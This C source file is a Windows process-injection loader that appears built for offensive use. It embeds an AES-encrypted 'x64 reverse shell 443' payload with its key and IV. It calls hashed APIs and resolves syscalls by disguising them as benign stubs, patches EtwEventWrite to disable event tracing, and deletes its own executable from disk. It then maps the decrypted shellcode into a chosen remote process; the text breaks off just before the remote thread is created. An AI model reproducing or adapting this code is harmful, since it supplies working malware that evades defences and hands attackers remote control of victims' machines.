/*
*
* APC remote process injection with syscalls.
*
*/

#include <Windows.h>
#include <stdio.h>
#include "Common.h"
#include "AntiAnalysis.h"

#include <bcrypt.h>

#pragma comment(lib, "Bcrypt.lib")

SYSCALL_TAB g_SyscallTab = { 0 };
BENIGN_SYSCALL_TAB g_BenignSyscalltab = { 0 };
API_HASHING g_ApiTab = { 0 };

typedef struct _AES
{
	PBYTE pPlainText;               // base address of the plain text data
	DWORD dwPlainSize;              // size of the plain text data

	PBYTE pCipherText;              // base address of the encrypted data
	DWORD dwCipherSize;             // size of it (this can change from dwPlainSize in case there was padding)

	PBYTE pKey;                     // the 32 byte key
	PBYTE pIv;                      // the 16 byte iv
} AES, * PAES;

PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
{
	for (volatile int i = 0; i < Size; i++)
		((BYTE*)Destination)[i] = ((BYTE*)Source)[i];

	return Destination;
}

// the real decryption implemantation
BOOL InstallAesDecryption(PAES pAes)
{
	BOOL bSTATE = TRUE;

	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE hKeyHandle = NULL;

	ULONG cbResult = NULL;
	DWORD dwBlockSize = NULL;

	DWORD cbKeyObject = NULL;
	PBYTE pbKeyObject = NULL;

	PBYTE pbPlainText = NULL;
	DWORD cbPlainText = NULL;

	NTSTATUS STATUS = NULL;

	// intializing "hAlgorithm" as AES algorithm Handle
	STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);

	if (!NT_SUCCESS(STATUS))
	{
		DEBUG_PRINT("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// getting the size of the key object variable *pbKeyObject* this is used for BCryptGenerateSymmetricKey function later
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);

	if (!NT_SUCCESS(STATUS))
	{
		DEBUG_PRINT("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// getting the size of the block used in the encryption, since this is aes it should be 16 (this is what AES does)
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);

	if (!NT_SUCCESS(STATUS))
	{
		DEBUG_PRINT("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// checking if block size is 16
	if (16 != dwBlockSize)
	{
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// allocating memory for the key object
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);

	if (NULL == pbKeyObject)
	{
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// setting Block Cipher Mode to CBC (32 byte key and 16 byte Iv)
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

	if (!NT_SUCCESS(STATUS))
	{
		DEBUG_PRINT("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// generating the key object from the aes key "pAes->pKey", the output will be saved in "pbKeyObject" of size "cbKeyObject"
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);

	if (!NT_SUCCESS(STATUS))
	{
		DEBUG_PRINT("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// running BCryptDecrypt first time with NULL output parameters, thats to deduce the size of the output buffer, (the size will be saved in cbPlainText)
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);

	if (!NT_SUCCESS(STATUS))
	{
		DEBUG_PRINT("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// allocating enough memory (of size cbPlainText)
	pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);

	if (NULL == pbPlainText)
	{
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// running BCryptDecrypt second time with "pbPlainText" as output buffer
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);

	if (!NT_SUCCESS(STATUS))
	{
		DEBUG_PRINT("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// cleaning up
_EndOfFunc:
	if (hKeyHandle)
		BCryptDestroyKey(hKeyHandle);
	if (hAlgorithm)
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	if (pbKeyObject)
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	if (NULL != pbPlainText && bSTATE)
	{
		// if everything went well, we save pbPlainText and cbPlainText
		pAes->pPlainText = pbPlainText;
		pAes->dwPlainSize = cbPlainText;
	}

	return bSTATE;
}

// wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize)
{
	if (NULL == pCipherTextData || NULL == sCipherTextSize || NULL == pKey || NULL == pIv)
		return FALSE;

	AES Aes = {
			.pKey = pKey,
			.pIv = pIv,
			.pCipherText = pCipherTextData,
			.dwCipherSize = sCipherTextSize
	};

	if (!InstallAesDecryption(&Aes))
		return FALSE;

	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}

// x64 reverse shell 443
unsigned char payload[] = {
		0xAC, 0x9C, 0xD2, 0x56, 0xB6, 0xA2, 0x55, 0x9E, 0xF4, 0x95, 0xEA, 0x94, 0x1D, 0xBE, 0xCC, 0xB3,
		0x39, 0x97, 0x73, 0xB8, 0x95, 0xE2, 0x96, 0x36, 0x88, 0x32, 0xA1, 0xC1, 0x14, 0x40, 0xF8, 0xAF,
		0xDF, 0x75, 0x43, 0xAD, 0xA2, 0xD8, 0x2E, 0xA6, 0x65, 0xC4, 0x7B, 0x83, 0x91, 0x61, 0xE8, 0xEF,
		0x89, 0xB9, 0xE6, 0xC2, 0x26, 0xAE, 0xC5, 0x87, 0xE5, 0x20, 0x04, 0x42, 0x6B, 0x8C, 0xB1, 0x3C,
		0x70, 0xCC, 0xBC, 0xB2, 0x31, 0xDB, 0xAA, 0xDD, 0xE3, 0x85, 0xA6, 0xAB, 0xBD, 0x4D, 0xAE, 0xDF,
		0x93, 0xBB, 0x3F, 0xEA, 0xE8, 0x61, 0x15, 0x0E, 0x9A, 0xB6, 0x09, 0x3C, 0x0E, 0x54, 0x82, 0xA6,
		0x73, 0x4B, 0xC6, 0x92, 0xFE, 0x62, 0xBC, 0x64, 0xFE, 0xFA, 0xD7, 0xB6, 0x57, 0x6E, 0x8E, 0xD9,
		0x0A, 0x98, 0x19, 0x3F, 0x3B, 0xD1, 0xAE, 0xF6, 0xD4, 0x0A, 0x3F, 0x3A, 0x91, 0x86, 0x87, 0x21,
		0xC4, 0x2B, 0xD1, 0xE3, 0x5C, 0x18, 0x67, 0x37, 0x6C, 0xD6, 0x4C, 0xF3, 0x89, 0xA3, 0xE5, 0x51,
		0xEF, 0xC6, 0xD6, 0x30, 0xAC, 0xD3, 0x85, 0x93, 0x74, 0x3D, 0xA0, 0x70, 0xC2, 0x93, 0x14, 0xA6,
		0x0F, 0x20, 0x9D, 0x73, 0xFE, 0x24, 0xC0, 0xA3, 0x48, 0x8D, 0xC4, 0xE4, 0x24, 0x50, 0x96, 0x5B,
		0xF8, 0xBE, 0x03, 0x56, 0xF9, 0xA2, 0x15, 0x68, 0xCB, 0x46, 0x04, 0x8B, 0x47, 0xA4, 0xA0, 0x1D,
		0x4C, 0x19, 0x78, 0xC1, 0xF2, 0x5D, 0x7A, 0x9B, 0xB5, 0xCD, 0x10, 0x6B, 0xCF, 0x4F, 0x5F, 0x20,
		0x80, 0x51, 0x73, 0xE4, 0x47, 0x68, 0xFC, 0xCE, 0xC0, 0x5D, 0x62, 0x2D, 0xDE, 0x4A, 0x6D, 0xCF,
		0xC3, 0x4A, 0x14, 0x74, 0xBA, 0xC9, 0xAF, 0xAE, 0x19, 0x68, 0xFA, 0x79, 0xC4, 0x7D, 0x27, 0xC6,
		0xF3, 0x25, 0x2F, 0x54, 0x21, 0x0B, 0xB5, 0x39, 0xDB, 0x49, 0xA9, 0x2D, 0x00, 0x84, 0x5B, 0xB5,
		0xCC, 0xEE, 0x67, 0x44, 0x3B, 0x2B, 0xF4, 0xF8, 0xCF, 0xE3, 0xD5, 0x40, 0xDC, 0x55, 0xA8, 0xA3,
		0x65, 0xC3, 0x37, 0x90, 0x63, 0x6F, 0x6D, 0x12, 0x2F, 0x00, 0x42, 0x7D, 0xDC, 0x5F, 0xE6, 0x95,
		0x75, 0x1A, 0x2E, 0x4A, 0x64, 0x94, 0x34, 0xE6, 0x28, 0x9E, 0xFC, 0xEF, 0xDE, 0x0A, 0xD2, 0xCC,
		0xD2, 0xCC, 0x11, 0x50, 0x66, 0x2B, 0x25, 0x73, 0xDD, 0x19, 0x31, 0x8B, 0x91, 0xA2, 0xB8, 0x5C,
		0x53, 0x56, 0x9C, 0xF4, 0x45, 0xD7, 0xC6, 0x9D, 0x2A, 0x8C, 0x62, 0x18, 0x7A, 0x32, 0x22, 0x36,
		0xB1, 0x10, 0x51, 0xDD, 0x27, 0x05, 0xA9, 0xF5, 0x4B, 0x86, 0x16, 0x31, 0x72, 0x11, 0xD3, 0x29,
		0xEC, 0x04, 0xA0, 0x53, 0xDA, 0xDF, 0x1E, 0xF8, 0xB0, 0xEB, 0xE9, 0xAB, 0x30, 0x5C, 0x78, 0x95,
		0xEF, 0x4D, 0x7D, 0xDE, 0xF5, 0x2C, 0x92, 0x24, 0xA1, 0xC9, 0xFA, 0xC1, 0x2C, 0xF6, 0x71, 0x16,
		0x4E, 0x7A, 0xD2, 0x62, 0xB8, 0xC5, 0x84, 0x8C, 0x8F, 0x24, 0xCE, 0xBB, 0x89, 0x1E, 0x5B, 0xB0,
		0xEE, 0xC7, 0xA2, 0xAF, 0xAF, 0x68, 0xF4, 0xF2, 0x39, 0xEA, 0x86, 0xD5, 0x0E, 0x68, 0x5E, 0xA5,
		0xA4, 0x95, 0x3B, 0xD3, 0x12, 0x4C, 0x00, 0x58, 0xB7, 0x45, 0xD4, 0x28, 0xDF, 0x2C, 0x91, 0x9E,
		0x7B, 0xF9, 0x9E, 0xA4, 0xA3, 0x86, 0x85, 0x6E, 0x8F, 0x54, 0x48, 0x74, 0xD8, 0x95, 0x92, 0x7B,
		0x85, 0xBB, 0x35, 0x6D, 0x54, 0xFE, 0xD9, 0x18, 0x17, 0x33, 0xDA, 0x5C, 0x3D, 0xD9, 0x82, 0x1C };

unsigned char AesKey[] = {
		0x98, 0xEA, 0xD1, 0x38, 0xA0, 0xC0, 0xC8, 0x22, 0xAE, 0x6F, 0x70, 0x53, 0xEA, 0x90, 0xC8, 0x55,
		0x01, 0x2F, 0x82, 0xA8, 0xC9, 0xD9, 0xC1, 0x6F, 0x24, 0xF6, 0x21, 0x6A, 0x26, 0x5A, 0xF8, 0x24 };

unsigned char AesIv[] = {
		0xE7, 0x12, 0x9B, 0x91, 0xF0, 0x42, 0x6C, 0x3C, 0xD0, 0x3B, 0xFB, 0x63, 0x21, 0x3C, 0x5A, 0x61 };

BOOL InitializeNtSyscalls()
{
	// resolve benign syscalls
	if (!ResolveNtSyscall(NtCreateFile_CRC32, &g_BenignSyscalltab.NtCreateFile))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtCreateFile \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_BenignSyscalltab.NtCreateFile.dwSSn, g_BenignSyscalltab.NtCreateFile.pSyscallAddress);

	if (!ResolveNtSyscall(NtOpenFile_CRC32, &g_BenignSyscalltab.NtOpenFile))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtOpenFile \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtOpenFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_BenignSyscalltab.NtOpenFile.dwSSn, g_BenignSyscalltab.NtOpenFile.pSyscallAddress);

	if (!ResolveNtSyscall(NtWriteFile_CRC32, &g_BenignSyscalltab.NtWriteFile))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtWriteFile \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtWriteFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_BenignSyscalltab.NtWriteFile.dwSSn, g_BenignSyscalltab.NtWriteFile.pSyscallAddress);

	if (!ResolveNtSyscall(NtLockFile_CRC32, &g_BenignSyscalltab.NtLockFile))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtLockFile \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtLockFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_BenignSyscalltab.NtLockFile.dwSSn, g_BenignSyscalltab.NtLockFile.pSyscallAddress);

	// resolve syscalls
	if (!ResolveNtSyscall(NtOpenProcess_CRC32, &g_SyscallTab.NtOpenProcess))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtOpenProcess \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtOpenProcess.dwSSn, g_SyscallTab.NtOpenProcess.pSyscallAddress);

	if (!ResolveNtSyscall(NtQueryInformationProcess_CRC32, &g_SyscallTab.NtQueryInformationProcess))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtQueryInformationProcess \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtQueryInformationProcess.dwSSn, g_SyscallTab.NtQueryInformationProcess.pSyscallAddress);

	if (!ResolveNtSyscall(NtCreateSection_CRC32, &g_SyscallTab.NtCreateSection))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtCreateSection \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtCreateSection.dwSSn, g_SyscallTab.NtCreateSection.pSyscallAddress);

	if (!ResolveNtSyscall(NtMapViewOfSection_CRC32, &g_SyscallTab.NtMapViewOfSection))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtMapViewOfSection \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtMapViewOfSection.dwSSn, g_SyscallTab.NtMapViewOfSection.pSyscallAddress);

	if (!ResolveNtSyscall(NtUnmapViewOfSection_CRC32, &g_SyscallTab.NtUnmapViewOfSection))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtUnmapViewOfSection \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtUnmapViewOfSection.dwSSn, g_SyscallTab.NtUnmapViewOfSection.pSyscallAddress);

	if (!ResolveNtSyscall(NtCreateThreadEx_CRC32, &g_SyscallTab.NtCreateThreadEx))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtCreateThreadEx.dwSSn, g_SyscallTab.NtCreateThreadEx.pSyscallAddress);

	if (!ResolveNtSyscall(NtQueueApcThread_CRC32, &g_SyscallTab.NtQueueApcThread))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtQueueApcThread \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtQueueApcThread.dwSSn, g_SyscallTab.NtQueueApcThread.pSyscallAddress);

	if (!ResolveNtSyscall(NtAlertResumeThread_CRC32, &g_SyscallTab.NtAlertResumeThread))
	{
		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtAlertResumeThread \n");
		return FALSE;
	}
	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtAlertResumeThread.dwSSn, g_SyscallTab.NtAlertResumeThread.pSyscallAddress);

	return TRUE;
}

BOOL InitializeApi()
{
	g_ApiTab.pGetModuleFileNameW = GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), GetModuleFileNameW_CRC32);
	g_ApiTab.pCloseHandle = GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), CloseHandle_CRC32);
	g_ApiTab.pCreateFileW = GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), CreateFileW_CRC32);
	g_ApiTab.pSetFileInformationByHandle = GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), SetFileInformationByHandle_CRC32);

	if (NULL == g_ApiTab.pGetModuleFileNameW
		|| NULL == g_ApiTab.pCloseHandle
		|| NULL == g_ApiTab.pCreateFileW
		|| NULL == g_ApiTab.pSetFileInformationByHandle)
		return FALSE;

	return TRUE;
}

BOOL DisableETW(HANDLE hRemoteProc)
{
	NTSTATUS status = 0x0;
	fnVirtualProtect pfnVirtualProtect = NULL;
	PVOID EtwEventWrite = (PVOID)GetProcAddressH(GetModuleHandleH(NTDLL_CRC32), EtwEventWrite_CRC32);
	PVOID EtwEventWriteEx = (PVOID)GetProcAddressH(GetModuleHandleH(NTDLL_CRC32), EtwEventWriteEx_CRC32);
	pfnVirtualProtect = (fnVirtualProtect)GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), VirtualProtect_CRC32);

	DEBUG_PRINT("[!] VirtualProtect @ 0x%p ... \n", pfnVirtualProtect);

	DEBUG_PRINT("[!] EtwEventWrite @ 0x%p \n", EtwEventWrite);
	DEBUG_PRINT("[!] EtwEventWriteEx @ 0x%p \n", EtwEventWriteEx);

	//PVOID pAddr = NULL;
	//SIZE_T sAlloc = 0x1000;

	//SET_SYSCALL(g_SyscallTab.NtAllocateVirtualMemory, g_Benign_Syscall_tab.NtOpenFile);
	//if (!NT_SUCCESS((status = ExecSyscall((HANDLE)-1, &pAddr, 0, &sAlloc, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))))
	//{
	//	SET_LAST_NT_ERROR(status);
	//	DEBUG_PRINT("[!] NtAllocateVirtualMemory for EtwEventWrite Failed With Error: 0x%0.8X \n", GetLastError());
	//	return FALSE;
	//}

	//DEBUG_PRINT("[!] pAddr @ ============> 0x%p ... \n", pAddr);

	DEBUG_PRINT("[!] Press Enter to patch Etw ... \n");
	_INT;

	SIZE_T numberOfBytesToProtect1 = 0x10;
	SIZE_T numberOfBytesToProtect2 = 0x10;
	DWORD oldAccessProtection1 = 0x0;
	DWORD oldAccessProtection2 = 0x0;

	pfnVirtualProtect(EtwEventWrite, numberOfBytesToProtect1, PAGE_EXECUTE_READWRITE, &oldAccessProtection1);
	pfnVirtualProtect(EtwEventWriteEx, numberOfBytesToProtect2, PAGE_EXECUTE_READWRITE, &oldAccessProtection2);

	DEBUG_PRINT("[!] Press Enter to write patch ... \n");
	_INT;

#ifdef _WIN64
	_memcpy(EtwEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
	_memcpy(EtwEventWriteEx, "\x48\x33\xc0\xc3", 4); 	// xor rax, rax; ret
#else
	_memcpy(EtwEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
	_memcpy(EtwEventWriteEx, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
#endif

	DEBUG_PRINT("[!] Press Enter to restore Etw Memory Protect ... \n");
	_INT;

	pfnVirtualProtect(EtwEventWrite, 4096, oldAccessProtection1, &oldAccessProtection1);
	pfnVirtualProtect(EtwEventWriteEx, 4096, oldAccessProtection2, &oldAccessProtection2);

	FlushInstructionCache((HANDLE)-1, EtwEventWrite, 4096);
	FlushInstructionCache((HANDLE)-1, EtwEventWriteEx, 4096);

	return TRUE;
}

BOOL DeleteSelf()
{
	WCHAR					szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO	Delete = { 0 };
	HANDLE					hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename = NULL;
	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
	SIZE_T					sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename)
	{
		DEBUG_PRINT("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	Delete.DeleteFile = TRUE;

	pRename->FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

	if (g_ApiTab.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0)
	{
		DEBUG_PRINT("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	hFile = g_ApiTab.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		DEBUG_PRINT("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT(L"[i] Renaming :$DATA to %ls  ...", NEW_STREAM);

	if (!g_ApiTab.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename))
	{
		DEBUG_PRINT("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[+] DONE \n");

	CloseHandle(hFile);

	hFile = g_ApiTab.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (INVALID_HANDLE_VALUE == hFile && ERROR_FILE_NOT_FOUND == GetLastError())
		return TRUE;

	if (INVALID_HANDLE_VALUE == hFile)
	{
		DEBUG_PRINT("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[i] DELETING ...");

	if (!g_ApiTab.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete)))
	{
		DEBUG_PRINT("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[+] DONE \n");

	g_ApiTab.pCloseHandle(hFile);

	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}

int main(int argc, char* argv[])
{
	if (TimeTickCheck())
		return -1;
	
	if (argc < 2)
	{
		printf("[-]Usage: %s <process id> ...\n", argv[0]);
		return -1;
	}

	PDWORD64 dwPid = (PDWORD64)atoi(argv[1]);
	NTSTATUS status = 0x0;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	OBJECT_ATTRIBUTES oa = { 0 };
	SecureZeroMemory(&oa, sizeof(OBJECT_ATTRIBUTES));
	// or memset(&oa, 0, sizeof(OBJECT_ATTRIBUTES));
	CLIENT_ID cid = { 0 };
	cid.UniqueProcess = dwPid;
	DWORD64 isWoW64 = 0x0;
	ULONG retLen = 0x0;
	HANDLE hSection = INVALID_HANDLE_VALUE;

	PVOID lpLocalMap = NULL;
	SIZE_T sViewSize = 0x0;
	PVOID lpRemoteMap = NULL;
	HANDLE hRemoteThread = NULL;

	LARGE_INTEGER maxSize = {
		.LowPart = sizeof(payload),
		.HighPart = 0
	};

	if (!InitializeNtSyscalls())
	{
		DEBUG_PRINT("[!] Failed To Initialize The Specified Direct-Syscalls \n");
		return -1;
	}

	if (!InitializeApi())
	{
		DEBUG_PRINT("[!] Failed To Initialize API \n");
		return -1;
	}

	if (!DeleteSelf())
		return -1;

	// open target process
	SET_SYSCALL(g_SyscallTab.NtOpenProcess, g_BenignSyscalltab.NtCreateFile);
	if ((status = ExecSyscall(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid)))
	{
		SET_LAST_NT_ERROR(status);
		DEBUG_PRINT("[!] NtOpenProcess Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

	DEBUG_PRINT("[*]Target process: 0x%p\n", hProcess);

	DisableETW(hProcess);

	SET_SYSCALL(g_SyscallTab.NtQueryInformationProcess, g_BenignSyscalltab.NtWriteFile);
	if ((status = ExecSyscall(hProcess, ProcessWow64Information, &isWoW64, sizeof(DWORD64), &retLen)))
	{
		SET_LAST_NT_ERROR(status);
		DEBUG_PRINT("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}
	DEBUG_PRINT("[*]Process architecture is: %s\n", isWoW64 == 1 ? "32bit" : "64bit");

	DEBUG_PRINT("[i]Press Enter to call NtCreateSection ...\n");
	_INT;

	SET_SYSCALL(g_SyscallTab.NtCreateSection, g_BenignSyscalltab.NtWriteFile);
	if ((status = ExecSyscall(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))
	{
		SET_LAST_NT_ERROR(status);
		DEBUG_PRINT("[!] NtCreateSection Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}
	DEBUG_PRINT("[*]Local section created at: 0x%p\n", hSection);

	DEBUG_PRINT("[i]Press Enter to call NtMapViewOfSection to local process ...\n");
	_INT;

	SET_SYSCALL(g_SyscallTab.NtMapViewOfSection, g_BenignSyscalltab.NtOpenFile);
	if ((status = ExecSyscall(hSection, (HANDLE)-1, &lpLocalMap, NULL, NULL, NULL, &sViewSize, 0x1, NULL, PAGE_READWRITE)))
	{
		SET_LAST_NT_ERROR(status);
		DEBUG_PRINT("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

	DEBUG_PRINT("[*]Local view mapped at: 0x%p\n", lpLocalMap);
	DEBUG_PRINT("[i]Press Enter to decrypt payload and call memcpy ...\n");
	_INT;

	PVOID pPlaintext = NULL;
	DWORD dwPlainSize = NULL;

	// decryption
	if (!SimpleDecryption(payload, sizeof(payload), AesKey, AesIv, &pPlaintext, &dwPlainSize))
		return -1;

	_memcpy(lpLocalMap, pPlaintext, dwPlainSize);

	DEBUG_PRINT("[i]Press Enter to call NtMapViewOfSection to remote process ...\n");
	_INT;

	SET_SYSCALL(g_SyscallTab.NtMapViewOfSection, g_BenignSyscalltab.NtLockFile);
	if ((status = ExecSyscall(hSection, hProcess, &lpRemoteMap, NULL, NULL, NULL, &sViewSize, 0x1, NULL, PAGE_EXECUTE_READ)))
	{
		SET_LAST_NT_ERROR(status);
		DEBUG_PRINT("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

	DEBUG_PRINT("[*]Remote view mapped at: 0x%p\n", lpRemoteMap);
	DEBUG_PRINT("[i]Press Enter to call NtUnmapViewOfSection ...\n");
	_INT;

	SET_SYSCALL(g_SyscallTab.NtUnmapViewOfSection, g_BenignSyscalltab.NtCreateFile);
	if ((status = ExecSyscall((HANDLE)-1, lpLocalMap)))
	{
		SET_LAST_NT_ERROR(status);
		DEBUG_PRINT("[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

	DEBUG_PRINT("[*]Remote view mapped at: 0x%p\n", lpRemoteMap);
	DEBUG_PRINT("[i]Press Enter to load ntdll.dll ...\n");
	_INT;

	PVOID RtlExitUserThread = (PVOID)GetProcAddressH(GetModuleHandleH(NTDLL_CRC32), RtlExitUserThread_CRC32);

	DEBUG_PRINT("[*]RtlExitUserThread found @: %p\n", RtlExitUserThread);

	DEBUG_PRINT("[i]Press Enter to call NtCreateThreadEx @ 0x%p with syscall number %d ...\n", g_SyscallTab.NtCreateThreadEx.pSyscallAddress, g_SyscallTab.NtCreateThreadEx.dwSSn);
	_INT;

	SET_SYSCALL(g_SyscallTab.NtCreateThreadEx, g_BenignSyscalltab.NtOpenFile);
